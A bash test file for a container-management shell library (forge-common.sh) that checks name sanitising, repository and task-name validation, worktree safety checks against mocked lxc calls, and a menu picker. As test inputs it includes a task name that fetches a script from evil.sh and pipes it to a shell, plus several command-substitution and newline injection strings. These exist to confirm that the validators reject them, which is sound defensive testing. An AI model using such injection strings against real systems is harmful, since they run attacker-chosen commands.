#!/bin/bash
# Tests de scripts/lib/forge-common.sh.
# sanitize_container_name et validate_owner_repo sont du bash pur : testés
# en les exécutant réellement. Le reste (list_forge_containers, etc.)
# appelle lxc : vérifié par grep (structurel), pas par exécution (Task 10).
# Lancer : bash tests/test-forge-common.sh
set -e

LIB="$(cd "$(dirname "$0")/.." && pwd)/scripts/lib/forge-common.sh"
PASS=0
FAIL=0

assert_eq() {
  local desc="$1" actual="$2" expected="$3"
  if [ "$actual" = "$expected" ]; then
    PASS=$((PASS + 1))
  else
    FAIL=$((FAIL + 1))
    echo "FAIL ($desc): got '$actual', expected '$expected'"
  fi
}

assert_contains() {
  if grep -qF -- "$1" "$LIB"; then
    PASS=$((PASS + 1))
  else
    FAIL=$((FAIL + 1))
    echo "FAIL (attendu présent): $1"
  fi
}

echo "bash -n syntax check..."
bash -n "$LIB"

# shellcheck source=lib/forge-common.sh
source "$LIB"

# --- sanitize_container_name ---
assert_eq "simple owner/repo" "$(sanitize_container_name 'moroine/agent-forge')" "agent-moroine-agent-forge"
assert_eq "uppercase collapses" "$(sanitize_container_name 'Moroine/Agent-Forge')" "agent-moroine-agent-forge"
assert_eq "dots collapse to dash" "$(sanitize_container_name 'my.org/my.repo')" "agent-my-org-my-repo"

# --- validate_owner_repo ---
if validate_owner_repo 'moroine/agent-forge' 2>/dev/null; then
  PASS=$((PASS + 1))
else
  FAIL=$((FAIL + 1))
  echo "FAIL: valid owner/repo rejected"
fi

if validate_owner_repo 'not-a-repo' 2>/dev/null; then
  FAIL=$((FAIL + 1))
  echo "FAIL: invalid owner/repo accepted"
else
  PASS=$((PASS + 1))
fi

if validate_owner_repo $'acme/repo\ntouch /tmp/PWNED' 2>/dev/null; then
  FAIL=$((FAIL + 1))
  echo "FAIL: owner/repo with embedded newline accepted"
else
  PASS=$((PASS + 1))
fi

# --- validate_task_name ---
if validate_task_name 'my-task_1.2' 2>/dev/null; then
  PASS=$((PASS + 1))
else
  FAIL=$((FAIL + 1))
  echo "FAIL: valid task-name rejected"
fi

if validate_task_name 'x$(curl evil.sh|sh)' 2>/dev/null; then
  FAIL=$((FAIL + 1))
  echo "FAIL: task-name with shell metacharacters accepted"
else
  PASS=$((PASS + 1))
fi

if validate_task_name $'main\ntouch /tmp/PWNED' 2>/dev/null; then
  FAIL=$((FAIL + 1))
  echo "FAIL: task-name with embedded newline accepted"
else
  PASS=$((PASS + 1))
fi

# --- discovery / collision helpers: structural (they call lxc) ---
assert_contains 'user.forge.repo'
assert_contains 'user.forge.mode'
assert_contains 'startswith("agent-")'
assert_contains 'container_for_repo'
assert_contains 'check_container_name_collision'
assert_contains 'require_container_for_repo'

# --- case-insensitive repo matching (regression: same repo, different case
# must not be treated as a naming collision or as "not found") ---
# lxc isn't installed here, so mock just enough surface to exercise the real
# functions instead of grepping for the fix.
_MOCK_CONTAINERS='[{"name":"agent-moroine-agent-forge"}]'
lxc() {
  case "$*" in
    "list -f json")
      echo "$_MOCK_CONTAINERS"
      ;;
    "config get agent-moroine-agent-forge user.forge.repo")
      echo "moroine/agent-forge"
      ;;
    "info agent-moroine-agent-forge")
      return 0
      ;;
    *)
      echo "unexpected lxc call: $*" >&2
      return 1
      ;;
  esac
}

if container_for_repo 'Moroine/Agent-Forge' > /dev/null 2>&1; then
  PASS=$((PASS + 1))
else
  FAIL=$((FAIL + 1))
  echo "FAIL: container_for_repo should match case-insensitively"
fi

if check_container_name_collision 'agent-moroine-agent-forge' 'Moroine/Agent-Forge' 2>/dev/null; then
  PASS=$((PASS + 1))
else
  FAIL=$((FAIL + 1))
  echo "FAIL: check_container_name_collision should not flag same repo, different case, as a collision"
fi

unset -f lxc

# --- regression: a same-named container with no user.forge.repo metadata
# (legacy pre-cutover container, or one left behind by a failed provisioning
# run) must block reuse instead of being silently treated as safe ---
lxc() {
  case "$*" in
    "info agent-legacy-container")
      return 0
      ;;
    "config get agent-legacy-container user.forge.repo")
      echo ""
      ;;
    *)
      echo "unexpected lxc call: $*" >&2
      return 1
      ;;
  esac
}

if check_container_name_collision 'agent-legacy-container' 'moroine/agent-forge' 2>/dev/null; then
  FAIL=$((FAIL + 1))
  echo "FAIL: check_container_name_collision should refuse a container with no forge metadata"
else
  PASS=$((PASS + 1))
fi

unset -f lxc

# --- regression (moved from test-forge-delete.sh after forge_check_wip was
# centralized here): a malicious branch name must not be interpolated into
# a further lxc exec call, and must block forge_check_wip rather than being
# silently treated as safe ---
lxc() {
  case "$*" in
    "exec evil-container -- su - aiuser -c cd /workspace && git worktree list --porcelain")
      printf 'worktree /workspace\n\nworktree /workspace/.trees/evil\n'
      ;;
    "exec evil-container -- su - aiuser -c cd /workspace/.trees/evil && git status --porcelain")
      echo ""
      ;;
    "config get evil-container user.forge.mode")
      echo ""
      ;;
    "exec evil-container -- su - aiuser -c cd /workspace/.trees/evil && git rev-parse --abbrev-ref HEAD")
      echo 'x$(touch /tmp/PWNED_test)y'
      ;;
    *)
      echo "unexpected lxc call: $*" >&2
      return 1
      ;;
  esac
}

rm -f /tmp/PWNED_test
if forge_check_wip evil-container 2>/dev/null; then
  FAIL=$((FAIL + 1))
  echo "FAIL: malicious branch name should have been rejected"
else
  PASS=$((PASS + 1))
fi
if [ -f /tmp/PWNED_test ]; then
  FAIL=$((FAIL + 1))
  echo "FAIL: injected command actually executed (/tmp/PWNED_test was created)"
else
  PASS=$((PASS + 1))
fi
rm -f /tmp/PWNED_test
unset -f lxc

# --- regression: a hostile worktree basename (as could appear in
# `git worktree list --porcelain` output) must not be interpolated into a
# further lxc exec call, and must be excluded by _forge_worktree_dirs rather
# than being silently processed ---
lxc() {
  case "$*" in
    "exec evil-wt-container -- su - aiuser -c cd /workspace && git worktree list --porcelain")
      printf 'worktree /workspace\n\nworktree /workspace/.trees/x$(touch /tmp/PWNED_wt)y\n\nworktree /workspace/.trees/feat-a\n'
      ;;
    "config get evil-wt-container user.forge.mode")
      echo ""
      ;;
    "exec evil-wt-container -- su - aiuser -c cd /workspace/.trees/feat-a && git status --porcelain")
      echo ""
      ;;
    "exec evil-wt-container -- su - aiuser -c cd /workspace/.trees/feat-a && git rev-parse --abbrev-ref HEAD")
      echo "agent/feat-a"
      ;;
    "exec evil-wt-container -- su - aiuser -c cd /workspace/.trees/feat-a && git log --oneline origin/main..agent/feat-a")
      echo ""
      ;;
    *)
      echo "unexpected lxc call: $*" >&2
      return 1
      ;;
  esac
}

rm -f /tmp/PWNED_wt
if _forge_worktree_dirs evil-wt-container | grep -qF 'PWNED'; then
  FAIL=$((FAIL + 1))
  echo "FAIL: hostile worktree dir was not excluded from _forge_worktree_dirs"
else
  PASS=$((PASS + 1))
fi
if forge_check_wip evil-wt-container 2>/dev/null; then
  PASS=$((PASS + 1))
else
  FAIL=$((FAIL + 1))
  echo "FAIL: hostile worktree entry should be dropped, leaving the valid worktree to pass forge_check_wip"
fi
if [ -f /tmp/PWNED_wt ]; then
  FAIL=$((FAIL + 1))
  echo "FAIL: injected command actually executed (/tmp/PWNED_wt was created)"
else
  PASS=$((PASS + 1))
fi
rm -f /tmp/PWNED_wt
unset -f lxc

# --- forge_check_wip: supervised mode only checks the dirty tree; being
# ahead of main with no origin/<branch> is expected steady state there,
# not something to block on (there is no credential to have pushed with) ---
lxc() {
  case "$*" in
    "config get sup-dirty user.forge.mode")
      echo "supervised"
      ;;
    "exec sup-dirty -- su - aiuser -c cd /workspace && git worktree list --porcelain")
      printf 'worktree /workspace\n\nworktree /workspace/.trees/feat-a\n'
      ;;
    "exec sup-dirty -- su - aiuser -c cd /workspace/.trees/feat-a && git status --porcelain")
      echo "M some-file.txt"
      ;;
    *)
      echo "unexpected lxc call: $*" >&2
      return 1
      ;;
  esac
}
if forge_check_wip sup-dirty 2>/dev/null; then
  FAIL=$((FAIL + 1))
  echo "FAIL: supervised container with a dirty tree should still be blocked"
else
  PASS=$((PASS + 1))
fi
unset -f lxc

lxc() {
  case "$*" in
    "config get sup-clean-ahead user.forge.mode")
      echo "supervised"
      ;;
    "exec sup-clean-ahead -- su - aiuser -c cd /workspace && git worktree list --porcelain")
      printf 'worktree /workspace\n\nworktree /workspace/.trees/feat-a\n'
      ;;
    "exec sup-clean-ahead -- su - aiuser -c cd /workspace/.trees/feat-a && git status --porcelain")
      echo ""
      ;;
    *)
      echo "unexpected lxc call: $*" >&2
      return 1
      ;;
  esac
}
if forge_check_wip sup-clean-ahead 2>/dev/null; then
  PASS=$((PASS + 1))
else
  FAIL=$((FAIL + 1))
  echo "FAIL: supervised container with a clean tree should never be blocked, even ahead of main"
fi
unset -f lxc

# --- autonomous mode (mode unset, same as today): unchanged behavior —
# a clean but never-pushed branch that's ahead of main still blocks ---
lxc() {
  case "$*" in
    "config get auto-ahead-unpushed user.forge.mode")
      echo ""
      ;;
    "exec auto-ahead-unpushed -- su - aiuser -c cd /workspace && git worktree list --porcelain")
      printf 'worktree /workspace\n\nworktree /workspace/.trees/foo\n'
      ;;
    "exec auto-ahead-unpushed -- su - aiuser -c cd /workspace/.trees/foo && git status --porcelain")
      echo ""
      ;;
    "exec auto-ahead-unpushed -- su - aiuser -c cd /workspace/.trees/foo && git rev-parse --abbrev-ref HEAD")
      echo "agent/foo"
      ;;
    "exec auto-ahead-unpushed -- su - aiuser -c cd /workspace/.trees/foo && git log --oneline origin/main..agent/foo")
      echo "abc1234 feat: x"
      ;;
    "exec auto-ahead-unpushed -- su - aiuser -c cd /workspace/.trees/foo && git rev-parse --verify origin/agent/foo")
      return 1
      ;;
    *)
      echo "unexpected lxc call: $*" >&2
      return 1
      ;;
  esac
}
if forge_check_wip auto-ahead-unpushed 2>/dev/null; then
  FAIL=$((FAIL + 1))
  echo "FAIL: autonomous container with a never-pushed branch ahead of main should still be blocked"
else
  PASS=$((PASS + 1))
fi
unset -f lxc

# --- forge_check_wip iterates all worktrees; a dirty one blocks ---
lxc() {
  case "$*" in
    "config get multi user.forge.mode") echo "" ;;
    "exec multi -- su - aiuser -c cd /workspace && git worktree list --porcelain")
      printf 'worktree /workspace\n\nworktree /workspace/.trees/feat-a\n\nworktree /workspace/.trees/feat-b\n' ;;
    "exec multi -- su - aiuser -c cd /workspace/.trees/feat-a && git status --porcelain") echo "" ;;
    "exec multi -- su - aiuser -c cd /workspace/.trees/feat-a && git rev-parse --abbrev-ref HEAD") echo "agent/feat-a" ;;
    "exec multi -- su - aiuser -c cd /workspace/.trees/feat-a && git log --oneline origin/main..agent/feat-a") echo "" ;;
    "exec multi -- su - aiuser -c cd /workspace/.trees/feat-b && git status --porcelain") echo "M dirty.txt" ;;
    *) echo "unexpected lxc call: $*" >&2; return 1 ;;
  esac
}
if forge_check_wip multi 2>/dev/null; then
  FAIL=$((FAIL + 1)); echo "FAIL: a dirty second worktree should block forge_check_wip"
else
  PASS=$((PASS + 1))
fi
unset -f lxc

# --- all worktrees clean & pushed → passes ---
lxc() {
  case "$*" in
    "config get clean user.forge.mode") echo "" ;;
    "exec clean -- su - aiuser -c cd /workspace && git worktree list --porcelain")
      printf 'worktree /workspace\n\nworktree /workspace/.trees/feat-a\n' ;;
    "exec clean -- su - aiuser -c cd /workspace/.trees/feat-a && git status --porcelain") echo "" ;;
    "exec clean -- su - aiuser -c cd /workspace/.trees/feat-a && git rev-parse --abbrev-ref HEAD") echo "agent/feat-a" ;;
    "exec clean -- su - aiuser -c cd /workspace/.trees/feat-a && git log --oneline origin/main..agent/feat-a") echo "" ;;
    *) echo "unexpected lxc call: $*" >&2; return 1 ;;
  esac
}
if forge_check_wip clean 2>/dev/null; then
  PASS=$((PASS + 1))
else
  FAIL=$((FAIL + 1)); echo "FAIL: all-clean worktrees should pass forge_check_wip"
fi
unset -f lxc

# --- worktree path helpers (pure) ---
assert_eq "worktree_relpath" "$(worktree_relpath 'feat-a')" ".trees/feat-a"
assert_eq "worktree_abspath" "$(worktree_abspath 'feat-a')" "/workspace/.trees/feat-a"

# --- build_status (pure comparison) ---
assert_eq "build up-to-date" "$(build_status abc123 abc123)" "up-to-date"
assert_eq "build behind" "$(build_status abc123 def456)" "behind"
assert_eq "build unknown (no container stamp)" "$(build_status '' def456)" "unknown"
assert_eq "build unknown (no image stamp)" "$(build_status abc123 '')" "unknown"

# --- versioning helpers that call lxc: structural ---
assert_contains 'FORGE_REPO_DIR'
assert_contains 'user.forge.image_commit'
assert_contains 'get-property agent-base user.forge.commit'

# --- next-task is retired: no shipped script should reference it ---
ROOT_DIR="$(cd "$(dirname "$0")/.." && pwd)"
if grep -rInF -- 'next-task' "$ROOT_DIR/scripts" "$ROOT_DIR/config" 2>/dev/null; then
  FAIL=$((FAIL + 1)); echo "FAIL: next-task still referenced under scripts/ or config/"
else
  PASS=$((PASS + 1))
fi
if [ -e "$ROOT_DIR/config/next-task.sh" ]; then
  FAIL=$((FAIL + 1)); echo "FAIL: config/next-task.sh still exists"
else
  PASS=$((PASS + 1))
fi

# --- forge_pick : menu numéroté partagé par les commandes interactives ---
# forge_pick refuse de prompter hors TTY, donc les cas interactifs passent par
# un pty (script -qec). Le choix est écrit sur stdout, l'invite sur stderr :
# on redirige séparément dans un fichier depuis l'intérieur du pty, sinon les
# deux flux se mélangeraient dans le terminal simulé.
PICK_TMP=$(mktemp -d)
trap 'rm -r "$PICK_TMP"' EXIT

pick_run() {
  local input="$1"; shift
  local args
  args=$(printf '%q ' "$@")
  printf '%s' "$input" | script -qec \
    "source '$LIB'; forge_pick $args > '$PICK_TMP/out' 2> '$PICK_TMP/err'; echo \$? > '$PICK_TMP/rc'" \
    /dev/null > /dev/null 2>&1 || true
  PICK_OUT=$(cat "$PICK_TMP/out"); PICK_ERR=$(cat "$PICK_TMP/err"); PICK_RC=$(tr -d '\r\n' < "$PICK_TMP/rc")
}

assert_pick() {
  local got="$1" want="$2" label="$3"
  if [ "$got" = "$want" ]; then
    PASS=$((PASS + 1))
  else
    FAIL=$((FAIL + 1))
    echo "FAIL ($label): attendu [$want], obtenu [$got]"
  fi
}

# Choix valide : l'index 1-based sur stdout, rien d'autre.
pick_run $'2\n' "Repo" alpha beta gamma
assert_pick "$PICK_OUT" "2" "forge_pick rend l'index choisi"
assert_pick "$PICK_RC" "0" "forge_pick sort en 0 sur choix valide"

# L'invite et la liste vont sur stderr, pour que $(forge_pick ...) reste propre.
case "$PICK_ERR" in
  *"1) alpha"*"3) gamma"*"Repo> "*) PASS=$((PASS + 1)) ;;
  *) FAIL=$((FAIL + 1)); echo "FAIL: liste/invite absentes de stderr: [$PICK_ERR]" ;;
esac

# Saisie invalide : on redemande au lieu d'abandonner.
pick_run $'9\nzero\n1\n' "Repo" alpha beta
assert_pick "$PICK_OUT" "1" "forge_pick redemande après une saisie invalide"

# Hors TTY (script, CI) : pas de blocage sur une invite que personne ne lira,
# et surtout pas de choix pris dans un stdin qui ne lui était pas destiné.
# stdin porte ici une saisie valide : sans la garde TTY, forge_pick la
# consommerait et rendrait "1".
if OUT=$(printf '1\n' | forge_pick "Repo" alpha beta 2>/dev/null); then
  FAIL=$((FAIL + 1)); echo "FAIL: forge_pick devrait échouer hors TTY (a rendu [$OUT])"
else
  assert_pick "$OUT" "" "forge_pick n'écrit rien hors TTY"
fi

# Liste vide : rien à choisir.
if forge_pick "Repo" < /dev/null > /dev/null 2>&1; then
  FAIL=$((FAIL + 1)); echo "FAIL: forge_pick devrait échouer sur une liste vide"
else
  PASS=$((PASS + 1))
fi

echo ""
echo "PASS=$PASS FAIL=$FAIL"
[ "$FAIL" -eq 0 ]
